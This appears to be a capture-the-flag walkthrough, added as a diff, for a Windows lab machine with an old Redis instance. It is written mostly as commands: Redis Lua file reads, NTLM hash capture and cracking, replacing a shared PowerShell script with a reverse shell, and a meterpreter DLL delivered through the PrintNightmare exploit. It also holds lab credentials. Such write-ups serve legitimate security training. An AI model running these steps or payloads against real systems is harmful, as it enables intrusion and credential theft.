@@ -1,0 +1,108 @@
+ip : 10.10.84.7
+Domain : vulnnet.local
+
+open ports :
+	53/tcp    open  domain        Simple DNS Plus
+	135/tcp   open  msrpc         Microsoft Windows RPC
+	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+	445/tcp   open  microsoft-ds?
+	464/tcp   open  kpasswd5?
+	6379/tcp  open  redis         Redis key-value store 2.8.2402
+	9389/tcp  open  mc-nmf        .NET Message Framing
+	49665/tcp open  msrpc         Microsoft Windows RPC
+	49668/tcp open  msrpc         Microsoft Windows RPC
+	49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+	49670/tcp open  msrpc         Microsoft Windows RPC
+	49683/tcp open  msrpc         Microsoft Windows RPC
+	49699/tcp open  msrpc         Microsoft Windows RPC
+
+- rpcclient and smbclient got access denied
+- enumerating redis
+	redis-cli -h 10.10.84.7
+	> info
+	> CONFIG GET *
+	
+- we have an old version of redis running on the box
+	redis_version:2.8.2402
+- we have a username from the redis config
+	enterprise-security
+- further googling on redis showed that since the version of redis is very old there is a way to leak info through error messages 
+- We are able to make some chunk of data leak through error messages by using the command 
+	eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+	
+- using this we get the user.txt from the machine 
+
+Foothold
+--------
+- we can run responder 
+	responder -I tun0 -dvw
+	
+- now we can force the server to request for a share from out machine and can posibly capture the hash of the user while dong do
+- run this command on redis-cli to request for a share
+	eval "dofile('//10.8.179.136/share')" 0
+	
+- the share mentioned in the above command can be a random share name which doesnt exist
+- we have successfully captured the hash for the user
+- cracking it with hashcat
+	hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+	
+- we got the password for the user enterprise-security
+	creds : enterprise-security : sand_0873959498
+	
+- since we have the credentials for a user, now we can check for smb shares as the user
+	smbclient -L //10.10.84.7 -U enterprise-security --password sand_0873959498
+	
+- we are able to list the shares and we have write access on a share
+	smbclient //10.10.84.7/Enterprise-Share -U enterprise-security --password sand_0873959498 
+	
+- downloading the file in the share using mget
+- it is a powershell script named PurgeIrrelevantData_1826.ps1
+- replacing the contents of the file with nashangs Invoke-PowerShellTcp.ps1 and adding the following line to the end of the script and uploading to smb
+	Invoke-PowerShellTcp -Reverse -IPAddress 10.8.179.136 -Port 9001
+
+- we setup a netcat listener 
+	rlwrap nc -nlvp 9001
+
+- we got a shell as the user enterprise-security
+
+Priv-esc
+--------
+- we run whoami /all to check for groups and privileges 
+- we can see that we have seImpersonate Privileges which can be exploited using potato attacks 
+- but we can check if the machine is vulnerable to print nightmare or not 
+- for that we have to create a virtual environment
+- follow these steps
+	# install vitual environment in kali
+	apt install virtualenv
+
+	# git clone the impacket repo from github
+	git clone https://github.com/cube0x0/impacket.git
+
+	# move to impacket directory and run these commands
+	cd impacket
+	virtualenv --python=python3 impacket
+	source impacket/bin/activate  
+
+	# run these for the installation procedures 
+	pip3 install .
+	pip2 install .   
+
+- now we create a malicious dll with msfvenom and we place it inside the virtual container
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.179.136 LPORT=1337 -f dll > shell.dll
+
+- on another window start msfconsole and setup a listener 
+	> use multi/handler
+	> set lhost tun0
+	> set lport 1337
+	> set payload windows/x64/meterpreter/reverse_tcp
+	> run
+
+- start a smb server inside the virtual environment using the smbserver.py to host the malicious dll we created 
+	smbserver.py share `pwd` -smb2support
+	
+- create another virtual envoronment following the steps above and place the CVE-2021–1675.py in the virtual environment directory
+- run the exploit 
+	python3 CVE-2021-1675.py VULNNET/enterprise-security:'sand_0873959498'@vulnnet.local '\\10.8.179.136\share\shell.dll'
+	
+- wait a little bit and we get a meterpreter shell on the listener we setup with msfconsole 	
+- cat the system.txt located in the admins desktop
